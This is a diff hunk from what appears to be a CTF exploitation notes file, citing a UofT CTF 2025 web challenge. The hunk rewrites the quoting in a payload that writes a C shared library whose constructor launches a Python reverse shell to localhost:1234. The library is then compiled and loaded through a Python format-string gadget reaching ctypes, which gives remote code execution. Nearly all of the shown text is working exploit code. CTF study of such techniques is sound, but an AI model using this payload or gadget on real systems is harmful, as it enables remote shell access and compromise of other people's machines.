@@ -385,7 +385,7 @@ print(user)
 # - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared
 
 # essentially, write .so / .dll file to system first and then load it as a c library for RCE
-open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\\n__attribute__((constructor))\\nvoid init() {\\nsystem("python3 -c 'import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\\\"localhost\\\\", 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system(\\\\"/bin/sh\\\\")'");\\n}""")
+open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\\n__attribute__((constructor))\\nvoid init() {\\nsystem("python3 -c \\\\\\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\\\\\"");\\n}""")
 os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
 
 print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
